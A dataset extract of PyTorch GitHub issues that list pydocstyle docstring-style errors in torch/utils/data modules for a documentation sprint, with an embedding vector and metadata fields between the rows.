- **File**: `torch/utils/data/datapipes/iter/routeddecoder.py`, **Entity**: `RoutedDecoderIterDataPipe`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/routeddecoder.py`, **Entity**: `RoutedDecoderIterDataPipe`, **Line**: 19, **Description**: First line should end with a period (not 'a')
- **File**: `torch/utils/data/datapipes/iter/filelister.py`, **Entity**: `FileListerIterDataPipe`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/callable.py`, **Entity**: `MapperIterDataPipe`, **Line**: 23, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/callable.py`, **Entity**: `MapperIterDataPipe`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/callable.py`, **Entity**: `CollatorIterDataPipe`, **Line**: 173, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `SamplerIterDataPipe`, **Line**: 18, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 56, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 56, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ConcaterIterDataPipe`, **Line**: 26, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ConcaterIterDataPipe`, **Line**: 26, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ConcaterIterDataPipe`, **Line**: 26, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ForkerIterDataPipe`, **Line**: 64, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ContainerTemplate`, **Line**: 108, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ContainerTemplate`, **Line**: 108, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ContainerTemplate`, **Line**: 108, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `get_length_by_instance`, **Line**: 126, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `get_length_by_instance`, **Line**: 126, **Description**: First line should end with a period (not '`')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ForkerIterDataPipe`, **Line**: 136, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ForkerIterDataPipe`, **Line**: 136, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ForkerIterDataPipe`, **Line**: 136, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ChildDataPipe`, **Line**: 275, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ChildDataPipe`, **Line**: 275, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_ChildDataPipe`, **Line**: 275, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_set_main_datapipe_valid_iterator_id`, **Line**: 320, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_check_valid_iterator_id`, **Line**: 343, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `DemultiplexerIterDataPipe`, **Line**: 351, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `DemultiplexerIterDataPipe`, **Line**: 351, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `DemultiplexerIterDataPipe`, **Line**: 351, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_DemultiplexerIterDataPipe`, **Line**: 399, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `_DemultiplexerIterDataPipe`, **Line**: 399, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `MultiplexerIterDataPipe`, **Line**: 534, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `MultiplexerIterDataPipe`, **Line**: 534, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `MultiplexerIterDataPipe`, **Line**: 534, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ZipperIterDataPipe`, **Line**: 599, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/combining.py`, **Entity**: `ZipperIterDataPipe`, **Line**: 599, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/fileopener.py`, **Entity**: `FileOpenerIterDataPipe`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/fileopener.py`, **Entity**: `FileOpenerIterDataPipe`, **Line**: 15, **Description**: First line should end with a period (not 'm')
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `BatcherIterDataPipe`, **Line**: 31, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `BatcherIterDataPipe`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `BatcherIterDataPipe`, **Line**: 31, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `UnBatcherIterDataPipe`, **Line**: 91, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `UnBatcherIterDataPipe`, **Line**: 91, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `GrouperIterDataPipe`, **Line**: 143, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `GrouperIterDataPipe`, **Line**: 143, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/grouping.py`, **Entity**: `GrouperIterDataPipe`, **Line**: 143, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/iter/selecting.py`, **Entity**: `FilterIterDataPipe`, **Line**: 21, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/sharding.py`, **Entity**: `ShardingFilterIterDataPipe`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/sharding.py`, **Entity**: `ShardingFilterIterDataPipe`, **Line**: 30, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/iter/streamreader.py`, **Entity**: `StreamReaderIterDataPipe`, **Line**: 10, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/iter/streamreader.py`, **Entity**: `StreamReaderIterDataPipe`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/iter/streamreader.py`, **Entity**: `StreamReaderIterDataPipe`, **Line**: 10, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/data/datapipes/iter/utils.py`, **Entity**: `IterableWrapperIterDataPipe`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `validate_input_col`, **Line**: 26, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `validate_input_col`, **Line**: 26, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `_check_unpickable_fn`, **Line**: 127, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `_check_unpickable_fn`, **Line**: 127, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `_check_unpickable_fn`, **Line**: 127, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `StreamWrapper`, **Line**: 291, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `StreamWrapper`, **Line**: 291, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `StreamWrapper`, **Line**: 291, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `close_streams`, **Line**: 316, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `autoclose`, **Line**: 352, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/common.py`, **Entity**: `autoclose`, **Line**: 352, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `handle_extension`, **Line**: 87, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `handle_extension`, **Line**: 87, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `handle_extension`, **Line**: 87, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `ImageHandler`, **Line**: 115, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `ImageHandler`, **Line**: 115, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/decoder.py`, **Entity**: `Decoder`, **Line**: 270, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/snapshot.py`, **Entity**: `_simple_graph_snapshot_restoration`, **Line**: 11, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/utils/snapshot.py`, **Entity**: `_simple_graph_snapshot_restoration`, **Line**: 11, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/utils/snapshot.py`, **Entity**: `_simple_graph_snapshot_restoration`, **Line**: 11, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/data/datapipes/map/callable.py`, **Entity**: `MapperMapDataPipe`, **Line**: 20, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/callable.py`, **Entity**: `MapperMapDataPipe`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/utils.py`, **Entity**: `SequenceWrapperMapDataPipe`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combinatorics.py`, **Entity**: `ShufflerIterDataPipe`, **Line**: 15, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ConcaterMapDataPipe`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ConcaterMapDataPipe`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ZipperMapDataPipe`, **Line**: 58, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/combining.py`, **Entity**: `ZipperMapDataPipe`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/grouping.py`, **Entity**: `BatcherMapDataPipe`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/map/grouping.py`, **Entity**: `BatcherMapDataPipe`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/map/grouping.py`, **Entity**: `BatcherMapDataPipe`, **Line**: 12, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/dataframe/structures.py`, **Entity**: `DataChunkDF`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/dataframe/structures.py`, **Entity**: `DataChunkDF`, **Line**: 8, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/datapipes/dataframe/structures.py`, **Entity**: `DataChunkDF`, **Line**: 8, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/tensorboard/_convert_np.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/tensorboard/_convert_np.py`, **Entity**: `make_np`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/tensorboard/_convert_np.py`, **Entity**: `make_np`, **Line**: 9, **Description**: First line should end with a period (not '

cc @carljparker",False,"[-1.30669683e-01 -5.13045728e-01  8.04264173e-02 -2.25597709e-01
 -1.19146958e-01 -9.63422805e-02  1.16133988e-02 -6.26958236e-02
 -2.66904950e-01  2.38895491e-01 -1.98356032e-01 -5.00789136e-02
  6.54250085e-02  3.13566118e-01 -1.07703745e-01  4.24730629e-01
 -4.88281757e-01 -2.86349356e-01  2.56532222e-01  2.44073033e-01
  3.26853573e-01  4.06367481e-01 -1.45877331e-01  1.38429537e-01
 -2.51367837e-01  2.01304153e-01 -2.55766720e-01 -2.98519403e-01
 -1.33249372e-01  1.00796252e-01  3.05823207e-01  3.37404549e-01
 -7.88319856e-03  3.09074614e-02  3.00394624e-01  2.75665462e-01
 -1.09365016e-01 -1.65443331e-01  2.84584034e-02 -9.91856307e-03
 -1.08799757e-02  1.06233038e-01 -1.59078985e-01 -4.20583747e-02
 -1.05830029e-01 -3.34367692e-01 -3.95906180e-01  1.86913550e-01
 -2.21198261e-01  1.48163781e-01 -9.79230553e-02  2.28340834e-01
 -4.87312555e-01  2.61507303e-01  1.85627371e-01  1.17095158e-01
 -1.83033109e-01  4.87563252e-01  1.13925382e-01 -2.21187562e-01
 -1.24952961e-02  1.13019802e-01  4.44441438e-02  2.97167480e-01
 -1.95282251e-01  3.78495097e-01  3.84284556e-02  2.45324671e-01
  4.26339984e-01 -3.17529380e-01 -2.55849540e-01  9.14382748e-03
 -2.68298924e-01 -1.13155641e-01  2.10878998e-02  2.54239321e-01
 -3.26957464e-01  6.61511533e-03 -2.55213767e-01 -1.22012854e-01
 -4.11859810e-01 -1.42633438e-01  2.84769505e-01  5.98208494e-02
  1.49536341e-01 -1.93837464e-01  4.04734761e-02 -2.69696891e-01
  3.51786278e-02  2.50164568e-01  3.94029260e-01 -2.67966062e-01
  2.17769384e-01  3.93805474e-01  7.76484832e-02  2.73395658e-01
  1.77396476e-01 -6.38623759e-02  2.88662493e-01 -1.34203881e-01
 -9.53494012e-02 -2.21618831e-01 -8.57558623e-02  1.63783491e-01
  1.15054563e-01 -1.08765602e-01  5.42057678e-02 -1.29872128e-01
  1.95761159e-01  4.49755639e-02  9.40669626e-02 -4.57720459e-02
  2.81327635e-01 -1.05222195e-01  2.27254033e-01 -1.25024002e-02
 -2.69402117e-01  6.89870715e-02 -2.85312831e-01 -3.24829817e-02
  1.71488509e-01  1.67834222e-01  2.74801981e-02  1.68576047e-01
 -3.55462432e-02  9.36709791e-02  5.94153777e-02 -1.53469682e-01
  1.57030106e-01 -2.03508735e-01  3.37098718e-01 -1.28312316e-03
 -1.03170358e-01  1.95375934e-01  8.86746943e-02  5.79861412e-03
 -2.87675261e-01 -5.42337060e-01 -3.29168141e-01 -9.37985703e-02
 -2.24375308e-01 -3.88148189e-01 -2.54728142e-02 -1.70638695e-01
  2.96482414e-01  4.50368196e-01 -5.37933588e-01  4.14974183e-01
 -6.51098639e-02  3.01992476e-01 -7.23923296e-02  9.78565291e-02
 -1.68122441e-01  2.13585883e-01  5.11501245e-02  2.12813169e-02
  6.85219526e-01 -1.29259855e-01 -2.22517282e-01 -3.42944801e-01
  3.13532874e-02  2.21299052e-01 -2.72586979e-02 -1.88365042e-01
 -1.82908893e-01  1.08971477e-01 -2.79114693e-01 -6.08982816e-02
 -2.60129333e-01 -2.41202310e-01  1.09252870e-01  5.18895239e-02
  2.51791831e-02 -1.78052813e-01 -6.73472360e-02  1.53428525e-01
 -3.43951523e-01 -3.64757001e-01  2.16682523e-01  1.70799047e-01
 -2.00313836e-01  4.45392251e-01  1.46809109e-02 -1.94324180e-01
 -7.81522021e-02  9.48014110e-03  1.97810724e-01  1.04905911e-01
  1.84741408e-01  1.44020617e-01  1.15324788e-01 -4.50037748e-01
  3.42032492e-01 -1.04343630e-02 -1.75834194e-01  1.07600819e-03
  3.74109626e-01  6.79415762e-01 -7.96829909e-02  2.83524692e-01
 -6.63286224e-02  3.43136132e-01  4.08463627e-01 -1.73387825e-02
  3.96010190e-01 -7.36473352e-02 -2.54574090e-01 -2.22402707e-01
 -3.06188405e-01  1.95864454e-01 -3.62418294e-01 -1.75035268e-01
 -1.50435075e-01 -2.87481725e-01 -3.28541666e-01  1.67869002e-01
  2.97227412e-01 -6.46606237e-02 -1.72145683e-02 -3.40929389e-01
 -2.64467061e-01 -4.51603979e-02 -1.41461983e-01 -8.94418657e-02
  3.08284342e-01  4.03192863e-02 -6.42295331e-02  1.36387751e-01
 -1.82266459e-01 -5.87101169e-02 -6.74886480e-02  6.82267360e-04
  7.08559453e-01 -2.41661534e-01  1.34231165e-01  1.35233104e-01
  1.06803983e-01 -3.04160155e-02  1.79944411e-02  2.29030460e-01
  5.57736196e-02  1.04310423e-01 -8.34571123e-02 -7.72878081e-02
  4.08275872e-02 -3.29339206e-01 -9.09298509e-02 -3.45693588e-01
 -4.70000058e-01  9.73130688e-02 -2.49963880e-01 -4.26325977e-01
  4.17567372e-01  2.28319000e-02  6.05966330e-01 -4.00834484e-03
 -5.72115898e-01 -2.74037242e-01  1.02179833e-02  2.67751932e-01
  3.62264439e-02  2.39761502e-01 -1.62587911e-01  3.11552525e-01
  2.82339096e-01 -1.23522341e-01 -3.15105140e-01  2.15204716e-01
  2.10646927e-01 -2.85825491e-01  8.11602995e-02 -3.36984932e-01
  2.90629178e-01  5.53797260e-02  4.94405717e-01  1.37862578e-01
  1.96824491e-01 -6.46054000e-02 -1.06186047e-01  1.11746877e-01
 -2.43608914e-02  3.60004783e-01 -3.24480772e-01 -2.01487884e-01
  3.12445164e-01  6.10182732e-02 -5.69457039e-02 -1.70190990e-01
 -4.42040205e-01 -2.28776604e-01 -1.23717813e-02 -5.13338763e-03
  4.18757200e-01 -4.27258983e-02 -8.11015293e-02  2.85875406e-02
  9.64875743e-02  3.85658562e-01  4.65134770e-01  1.84651613e-02
 -6.67136252e-01 -1.40612468e-01 -1.21333465e-01  3.63112986e-01
  3.69895756e-01  1.84777454e-01  1.90241158e-01  1.97604954e-01
 -1.49200894e-02 -3.53479922e-01  4.49803233e-01  1.83882445e-01
 -3.39136869e-01  3.06112468e-02  7.88908526e-02 -3.89342606e-02
  8.58364031e-02  5.01340389e-01  3.26619923e-01  9.13917869e-02
 -2.53782690e-01 -3.84788990e-01 -4.01585191e-01 -9.22830254e-02
  1.73598856e-01 -1.10334039e-01 -2.04769328e-01  2.46798337e-01
 -3.11599433e-01 -3.96939635e-01  7.21677840e-02  1.70862764e-01
 -2.42035866e-01  2.22879238e-02  1.05358124e-01  4.76721041e-02
 -1.87518165e-01  6.14464954e-02  1.17053390e-01 -3.30134511e-01
 -2.27515493e-02 -1.81684062e-01  8.64036828e-02 -3.18734884e-01
 -1.85119033e-01 -1.35165095e-01  8.50577950e-02  2.91022032e-01
 -2.93334365e-01 -2.20454931e-01  3.98761392e-01 -3.35106663e-02
 -1.69169158e-01 -1.76692754e-02 -1.33964896e-01  4.21820879e-01
 -3.57973874e-02  1.49769083e-01 -4.07773182e-02  3.92842531e-01
 -3.76798600e-01 -3.63862701e-02 -4.01364326e-01 -5.26106119e-01
  1.17380723e-01 -2.86060274e-01 -1.03160307e-01  1.03957579e-02
  8.02604109e-02  2.58298159e-01 -1.80514276e-01  1.03427611e-01
 -1.08929999e-01  1.51173979e-01  1.28797233e-01  2.20782220e-01
  1.11712433e-01  9.65206847e-02  6.77020550e-02 -1.87603533e-01
 -4.89927113e-01  3.42074066e-01  3.66978735e-01 -3.38885725e-01]"
"Fix docstring errors in _hook_iterator.py, fetch.py, graph_settings.py, graph.py, distributed.py, gen_pyi.py, dataloader.py, signal_handling.py, collate.py, worker.py, dataset.py, sampler.py, _decorator.py, __init__.py, _typing.py, pin_memory.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse_dps`, **Line**: 85, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse`, **Line**: 102, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse`, **Line**: 102, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/data/graph.py`, **Entity**: `traverse`, **Line**: 102, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_sharding`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_shuffle_settings`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_shuffle_settings`, **Line**: 88, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_random_seed`, **Line**: 131, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/graph_settings.py`, **Entity**: `apply_random_seed`, **Line**: 131, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/data/dataloader.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `_InfiniteConstantSampler`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `DataLoader`, **Line**: 124, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `DataLoader`, **Line**: 124, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `DataLoader`, **Line**: 124, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/dataloader.py`, **Entity**: `_MultiProcessingDataLoaderIter`, **Line**: 684, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/data/distributed.py`, **Entity**: `set_epoch`, **Line**: 128, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/distributed.py`, **Entity**: `set_epoch`, **Line**: 128, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/distributed.py`, **Entity**: `set_epoch`, **Line**: 128, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/utils/data/dataset.py`, **Entity**: `IterableDataset`, **Line**: 76, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `TensorDataset`, **Line**: 194, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `StackDataset`, **Line**: 215, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `ConcatDataset`, **Line**: 262, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `ChainDataset`, **Line**: 312, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/dataset.py`, **Entity**: `Subset`, **Line**: 339, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `SequentialSampler`, **Line**: 99, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `RandomSampler`, **Line**: 117, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `RandomSampler`, **Line**: 117, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `SubsetRandomSampler`, **Line**: 175, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/sampler.py`, **Entity**: `WeightedRandomSampler`, **Line**: 196, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/_utils/signal_handling.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_convert`, **Line**: 21, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `collate`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `collate`, **Line**: 88, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `collate`, **Line**: 88, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/data/_utils/collate.py`, **Entity**: `default_collate`, **Line**: 205, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/utils/data/_utils/fetch.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/fetch.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/fetch.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/data/_utils/pin_memory.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/pin_memory.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/pin_memory.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: ``, **Line**: 1, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: `get_worker_info`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: `get_worker_info`, **Line**: 90, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/data/_utils/worker.py`, **Entity**: `get_worker_info`, **Line**: 90, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/data/datapipes/_decorator.py`, **Entity**: `__init__`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
